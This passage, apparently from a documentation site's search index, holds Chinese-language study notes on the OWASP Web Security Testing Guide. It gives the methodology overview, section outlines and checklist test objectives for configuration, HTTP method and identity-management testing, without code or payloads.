<li>\u6301\u7eed\u7684</li> <li>\u53ef\u91cd\u73b0</li> <li>\u4e25\u683c\u7684</li> <li>\u5728\u8d28\u91cf\u63a7\u5236\u4e0b</li> </ul> <p>\u8981\u89e3\u51b3\u7684\u95ee\u9898\u5df2\u5b8c\u6574\u8bb0\u5f55\u548c\u6d4b\u8bd5\u3002\u4f7f\u7528\u4e00\u79cd\u65b9\u6cd5\u6765\u6d4b\u8bd5\u6240\u6709\u5df2\u77e5\u6f0f\u6d1e\u5e76\u8bb0\u5f55\u6240\u6709\u5b89\u5168\u6d4b\u8bd5\u6d3b\u52a8\u975e\u5e38\u91cd\u8981\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%E3%80%81Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#owasp","title":"\u4ec0\u4e48\u662f OWASP \u6d4b\u8bd5\u65b9\u6cd5\uff1f","text":"<p>\u5b89\u5168\u6d4b\u8bd5\u6c38\u8fdc\u4e0d\u4f1a\u662f\u4e00\u95e8\u7cbe\u786e\u7684\u79d1\u5b66\uff0c\u53ef\u4ee5\u5b9a\u4e49\u5e94\u6d4b\u8bd5\u7684\u6240\u6709\u53ef\u80fd\u95ee\u9898\u7684\u5b8c\u6574\u5217\u8868\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5b89\u5168\u6d4b\u8bd5\u53ea\u662f\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u6d4b\u8bd5 Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6027\u7684\u4e00\u79cd\u9002\u5f53\u6280\u672f\u3002\u8fd9\u4e2a\u9879\u76ee\u7684<code>\u76ee\u6807</code>\u662f\u6536\u96c6\u6240\u6709\u53ef\u80fd\u7684\u6d4b\u8bd5\u6280\u672f\uff0c\u89e3\u91ca\u8fd9\u4e9b\u6280\u672f\uff0c\u5e76\u4fdd\u6301\u6307\u5357\u66f4\u65b0\u3002OWASP Web \u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u65b9\u6cd5\u57fa\u4e8e<code>\u9ed1\u76d2</code>\u65b9\u6cd5\u3002\u6d4b\u8bd5\u4eba\u5458\u5bf9\u8981\u6d4b\u8bd5\u7684\u5e94\u7528\u7a0b\u5e8f\u4e00\u65e0\u6240\u77e5\u6216\u77e5\u4e4b\u751a\u5c11\u3002</p> <p>\u6d4b\u8bd5\u6a21\u578b\u5305\u62ec\uff1a</p> <ul> <li>\u6d4b\u8bd5\u4eba\u5458\uff1a\u8c01\u6267\u884c\u6d4b\u8bd5\u6d3b\u52a8</li> <li>\u5de5\u5177\u548c\u65b9\u6cd5\uff1a\u672c\u6d4b\u8bd5\u6307\u5357\u9879\u76ee\u7684\u6838\u5fc3</li> <li>\u5e94\u7528\uff1a\u8981\u6d4b\u8bd5\u7684\u9ed1\u76d2</li> </ul> <p>\u6d4b\u8bd5\u53ef\u5206\u4e3a\u88ab\u52a8\u6216\u4e3b\u52a8\uff1a</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%E3%80%81Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_6","title":"\u88ab\u52a8\u6d4b\u8bd5","text":"<p>\u5728<code>\u88ab\u52a8\u6d4b\u8bd5</code>\u671f\u95f4\uff0c\u6d4b\u8bd5\u4eba\u5458\u8bd5\u56fe\u7406\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u903b\u8f91\u5e76\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u63a2\u7d22\u5e94\u7528\u7a0b\u5e8f\u3002\u5de5\u5177\u53ef\u7528\u4e8e\u4fe1\u606f\u6536\u96c6\u3002\u4f8b\u5982\uff0c<code>HTTP</code> \u4ee3\u7406\u53ef\u7528\u4e8e\u89c2\u5bdf\u6240\u6709 HTTP \u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u5728\u6b64\u9636\u6bb5\u7ed3\u675f\u65f6\uff0c\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u5927\u81f4\u4e86\u89e3\u7cfb\u7edf\u7684\u6240\u6709\u8bbf\u95ee\u70b9\u548c\u529f\u80fd\uff08\u4f8b\u5982\uff0cHTTP \u6807\u5934\u3001\u53c2\u6570\u3001cookie\u3001API\u3001\u6280\u672f\u4f7f\u7528/\u6a21\u5f0f\u7b49\uff09\u3002\u4fe1\u606f\u6536\u96c6\u90e8\u5206\u89e3\u91ca\u4e86\u5982\u4f55\u6267\u884c\u88ab\u52a8\u6d4b\u8bd5\u3002</p> <p>\u4f8b\u5982\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5728\u4ee5\u4e0b URL \u627e\u5230\u4e00\u4e2a\u9875\u9762\uff1a<code>https://www.example.com/login/auth_form</code></p> <p>\u8fd9\u53ef\u80fd\u8868\u793a\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u8eab\u4efd\u9a8c\u8bc1\u8868\u5355\u3002</p> <p>\u4ee5\u4e0b\u53c2\u6570\u8868\u793a\u5e94\u7528\u7a0b\u5e8f\u7684\u4e24\u4e2a\u8bbf\u95ee\u70b9\uff1a<code>https://www.example.com/appx?a=1&amp;b=1</code></p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u663e\u793a\u4e24\u4e2a\u8bbf\u95ee\u70b9\uff08\u53c2\u6570<code>a</code>\u548c<code>b</code>\uff09\u3002\u5728\u8fd9\u4e2a\u9636\u6bb5\u627e\u5230\u7684\u6240\u6709\u8f93\u5165\u70b9\u4ee3\u8868\u4e00\u4e2a\u6d4b\u8bd5\u76ee\u6807\u3002\u8ddf\u8e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u76ee\u5f55\u6216\u8c03\u7528\u6811\u4ee5\u53ca\u6240\u6709\u8bbf\u95ee\u70b9\u5728\u4e3b\u52a8\u6d4b\u8bd5\u671f\u95f4\u53ef\u80fd\u5f88\u6709\u7528\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1%E3%80%81Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/#_7","title":"\u4e3b\u52a8\u6d4b\u8bd5","text":"<p>\u5728\u4e3b\u52a8\u6d4b\u8bd5\u671f\u95f4\uff0c\u6d4b\u8bd5\u4eba\u5458\u5f00\u59cb\u4f7f\u7528\u4ee5\u4e0b\u90e8\u5206\u4e2d\u63cf\u8ff0\u7684\u65b9\u6cd5\u3002</p> <p>\u4e3b\u52a8\u6d4b\u8bd5\u96c6\u5df2\u5206\u4e3a 12 \u7c7b\uff1a</p> <ul> <li>\u4fe1\u606f\u6536\u96c6</li> <li>\u914d\u7f6e\u90e8\u7f72\u7ba1\u7406\u6d4b\u8bd5</li> <li>\u8eab\u4efd\u7ba1\u7406\u6d4b\u8bd5</li> <li>\u8ba4\u8bc1\u6d4b\u8bd5</li> <li>\u6388\u6743\u6d4b\u8bd5</li> <li>\u4f1a\u8bdd\u7ba1\u7406\u6d4b\u8bd5</li> <li>\u8f93\u5165\u9a8c\u8bc1\u6d4b\u8bd5</li> <li>\u9519\u8bef\u5904\u7406</li> <li>\u5bc6\u7801\u5b66</li> <li>\u4e1a\u52a1\u903b\u8f91\u6d4b\u8bd5</li> <li>\u5ba2\u6237\u7aef\u6d4b\u8bd5</li> <li>API\u6d4b\u8bd5</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/","title":"\u6982\u62ec","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<p>\u68c0\u67e5\u7f51\u7edc\u4e2d\u5e94\u7528\u7a0b\u5e8f\u7684\u914d\u7f6e\u96c6\u5e76\u9a8c\u8bc1\u4ed6\u4eec\u662f\u5426\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002 \u9a8c\u8bc1\u6240\u4f7f\u7528\u7684\u6846\u67b6\u548c\u7cfb\u7edf\u662f\u5426\u5b89\u5168\uff0c\u5e76\u4e14\u4e0d\u4f1a\u56e0\u672a\u7ef4\u62a4\u7684\u8f6f\u4ef6\u6216\u9ed8\u8ba4\u8bbe\u7f6e\u548c\u51ed\u636e\u800c\u53d7\u5230\u5df2\u77e5\u6f0f\u6d1e\u7684\u5f71\u54cd\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_4","title":"\u5df2\u77e5\u670d\u52a1\u5668\u6f0f\u6d1e","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_5","title":"\u7ba1\u7406\u5de5\u5177","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.1%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%85%8D%E7%BD%AE/#_6","title":"\u53c2\u8003","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/","title":"\u6d4b\u8bd5\u5e94\u7528\u5e73\u53f0","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_2","title":"\u6982\u62ec","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<p>[] \u786e\u4fdd\u9ed8\u8ba4\u6587\u4ef6\u548c\u5df2\u77e5\u6587\u4ef6\u5df2\u88ab\u5220\u9664 [] \u9a8c\u8bc1\u751f\u4ea7\u73af\u5883\u4e2d\u6ca1\u6709\u7559\u4e0b\u4efb\u4f55\u8c03\u8bd5\u4ee3\u7801\u6216\u6269\u5c55 [] \u68c0\u67e5\u4e3a\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6e\u7684\u65e5\u5fd7\u8bb0\u5f55\u673a\u5236</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_4","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_5","title":"\u9ed1\u76d2\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_6","title":"\u793a\u4f8b\u5df2\u77e5\u6587\u4ef6\u548c\u76ee\u5f55","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_7","title":"\u8bc4\u8bba\u5ba1\u6838","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_8","title":"\u7cfb\u7edf\u914d\u7f6e","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_9","title":"\u7070\u76d2\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_10","title":"\u914d\u7f6e\u5ba1\u67e5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_11","title":"\u8bb0\u5f55","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_12","title":"\u65e5\u5fd7\u4e2d\u7684\u654f\u611f\u4fe1\u606f","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_13","title":"\u65e5\u5fd7\u4f4d\u7f6e","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_14","title":"\u65e5\u5fd7\u5b58\u50a8","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_15","title":"\u65e5\u5fd7\u8f6e\u6362","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_16","title":"\u65e5\u5fd7\u8bbf\u95ee\u63a7\u5236","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_17","title":"\u65e5\u5fd7\u5ba1\u67e5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.3%E6%B5%8B%E8%AF%95%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0/#_18","title":"\u53c2\u8003","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/","title":"\u6d4b\u8bd5\u654f\u611f\u4fe1\u606f\u7684\u6587\u4ef6\u6269\u5c55\u540d\u5904\u7406","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_2","title":"\u6982\u8ff0","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u4e0d\u654f\u611f\u7684\u6587\u4ef6\u6269\u5c55\u540d\u6216\u53ef\u80fd\u5305\u542b\u539f\u59cb\u6570\u636e\u7684\u6269\u5c55\u540d\uff08\u4f8b\u5982\u811a\u672c\u3001\u539f\u59cb\u6570\u636e\u3001\u51ed\u636e\u7b49\uff09\u3002</li> <li>[ ] \u9a8c\u8bc1\u89c4\u5219\u96c6\u4e0a\u4e0d\u5b58\u5728\u7cfb\u7edf\u6846\u67b6\u7ed5\u8fc7</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_4","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_5","title":"\u5f3a\u5236\u6d4f\u89c8","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_6","title":"\u679a\u4e3e\u57fa\u7840\u8bbe\u65bd\u548c\u5e94\u7528\u7a0b\u5e8f\u7ba1\u7406\u754c\u9762","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_7","title":"\u6982\u62ec","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_8","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u9690\u85cf\u7684\u7ba1\u7406\u5458\u754c\u9762\u548c\u529f\u80fd</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#http","title":"\u6d4b\u8bd5HTTP\u65b9\u6cd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_9","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u679a\u4e3e\u652f\u6301\u7684HTTP\u65b9\u6cd5</li> <li>[ ] \u6d4b\u8bd5\u8bbf\u95ee\u63a7\u5236\u7ed5\u8fc7</li> <li>[ ] \u6d4b\u8bd5 XST \u6f0f\u6d1e</li> <li>[ ] \u6d4b\u8bd5 HTTP \u65b9\u6cd5\u91cd\u5199\u6280\u672f</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#http_1","title":"\u6d4b\u8bd5 HTTP \u4e25\u683c\u4f20\u8f93\u5b89\u5168\u6027","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_10","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5 HSTS \u6807\u5934\u53ca\u5176\u6709\u6548\u6027</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#ria","title":"\u6d4b\u8bd5 RIA \u8de8\u57df\u7b56\u7565","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_11","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5\u5e76\u9a8c\u8bc1\u7b56\u7565\u6587\u4ef6</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_12","title":"\u6d4b\u8bd5\u6587\u4ef6\u6743\u9650","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_13","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5\u5e76\u8bc6\u522b\u4efb\u4f55\u6076\u610f\u6587\u4ef6\u6743\u9650</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_14","title":"\u5b50\u57df\u63a5\u7ba1\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_15","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u679a\u4e3e\u6240\u6709\u53ef\u80fd\u7684\u5b50\u57df</li> <li>[ ] \u8bc6\u522b\u88ab\u9057\u5fd8\u6216\u9519\u8bef\u914d\u7f6e\u7684\u57df</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_16","title":"\u6d4b\u8bd5\u4e91\u5b58\u50a8","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2.4%E6%B5%8B%E8%AF%95%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%A4%84%E7%90%86/#_17","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc4\u4f30\u5b58\u50a8\u670d\u52a1\u7684\u8bbf\u95ee\u63a7\u5236\u914d\u7f6e\u662f\u5426\u6b63\u786e\u5230\u4f4d</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/2%E3%80%81%E9%85%8D%E7%BD%AE%E9%83%A8%E7%BD%B2%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/","title":"2\u3001\u914d\u7f6e\u90e8\u7f72\u7ba1\u7406\u6d4b\u8bd5","text":"<p>4.2.1\u6d4b\u8bd5\u7f51\u7edc\u57fa\u7840\u8bbe\u65bd\u914d\u7f6e</p> <p>4.2.2\u6d4b\u8bd5\u5e94\u7528\u5e73\u53f0\u914d\u7f6e</p> <p>4.2.3\u654f\u611f\u4fe1\u606f\u6d4b\u8bd5\u6587\u4ef6\u6269\u5c55\u540d\u5904\u7406</p> <p>4.2.4\u67e5\u770b\u65e7\u5907\u4efd\u548c\u672a\u5f15\u7528\u7684\u654f\u611f\u4fe1\u606f\u6587\u4ef6</p> <p>4.2.5\u679a\u4e3e\u57fa\u7840\u8bbe\u65bd\u548c\u5e94\u7528\u7ba1\u7406\u754c\u9762</p> <p>4.2.6\u6d4b\u8bd5 HTTP \u65b9\u6cd5</p> <p>4.2.7\u6d4b\u8bd5 HTTP \u4e25\u683c\u4f20\u8f93\u5b89\u5168</p> <p>4.2.8\u6d4b\u8bd5 RIA \u8de8\u57df\u7b56\u7565</p> <p>4.2.9\u6d4b\u8bd5\u6587\u4ef6\u6743\u9650</p> <p>4.2.10\u5b50\u57df\u63a5\u7ba1\u6d4b\u8bd5</p> <p>4.2.11\u6d4b\u8bd5\u4e91\u5b58\u50a8</p> <p>4.2.12\u5185\u5bb9\u5b89\u5168\u7b56\u7565\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/","title":"3\u3001\u8eab\u4efd\u7ba1\u7406\u6d4b\u8bd5","text":"<p>4.3.1\u6d4b\u8bd5\u89d2\u8272\u5b9a\u4e49</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_1","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u8bc6\u522b\u5e76\u8bb0\u5f55\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7684\u89d2\u8272</li> <li>[ ] \u5c1d\u8bd5\u5207\u6362\u3001\u6539\u53d8\u6216\u8bbf\u95ee\u53e6\u4e00\u4e2a\u89d2\u8272</li> <li>[ ] \u67e5\u770b\u89d2\u8272\u7684\u7c92\u5ea6\u4ee5\u53ca\u6240\u6388\u4e8e\u6743\u9650\u80cc\u540e\u7684\u9700\u6c42</li> </ul> <p>4.3.2\u6d4b\u8bd5\u7528\u6237\u6ce8\u518c\u6d41\u7a0b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u9a8c\u8bc1\u7528\u6237\u6ce8\u518c\u7684\u8eab\u4efd\u8981\u6c42\u662f\u5426\u7b26\u5408\u4e1a\u52a1\u548c\u5b89\u5168\u8981\u6c42</li> <li>[ ] \u9a8c\u8bc1\u6ce8\u518c\u8fc7\u7a0b</li> </ul> <p>4.3.3\u6d4b\u8bd5\u8d26\u53f7\u5f00\u901a\uff08\u914d\u7f6e\uff09\u6d41\u7a0b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_3","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u9a8c\u8bc1\u54ea\u4e9b\u8d26\u6237\u53ef\u4ee5\u914d\u7f6e\u5176\u4ed6\u8d26\u6237\u4ee5\u53ca\u7c7b\u578b</li> </ul> <p>4.3.4\u8d26\u53f7\u679a\u4e3e\u548c\u53ef\u731c\u6d4b\u7528\u6237\u8d26\u53f7\u6d4b\u8bd5</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/3%E3%80%81%E8%BA%AB%E4%BB%BD%E7%AE%A1%E7%90%86%E6%B5%8B%E8%AF%95/#_4","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>[ ] \u68c0\u67e5\u4e0e\u7528\u6237\u8bc6\u522b\u76f8\u5173\u7684\u6d41\u7a0b\uff08\u4f8b\u5982\u6ce8\u518c\u3001\u767b\u5f55\u7b49\uff09\u3002</li> <li>[ ] \u901a\u8fc7\u54cd\u5e94\u5206\u6790\u5c3d\u53ef\u80fd\u679a\u4e3e\u7528\u6237\u3002</li> </ul> 